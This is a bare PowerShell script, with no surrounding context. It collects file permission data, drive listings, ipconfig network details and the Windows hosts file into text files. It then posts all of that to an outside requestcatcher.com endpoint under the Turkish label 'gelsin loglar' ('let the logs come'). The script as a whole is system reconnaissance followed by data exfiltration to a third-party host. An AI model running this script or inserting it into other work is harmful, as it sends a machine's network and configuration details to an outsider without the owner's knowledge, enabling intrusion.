Get-Acl | Out-File C:\Users\log.txt -Append
Get-PSDrive -PSProvider FileSystem | Out-File C:\Users\log2.txt -Append
ipconfig | Out-File C:\Users\ipconfig.txt -Append

$d= cat c:\Windows\System32\Drivers\etc\hosts

$a= cat C:\Users\log.txt
$b= cat C:\Users\log2.txt
$c= cat C:\Users\ipconfig.txt


iwr -Uri https://pstest06.requestcatcher.com/ -Method POST -Body "gelsin loglar $d $a $b $c"
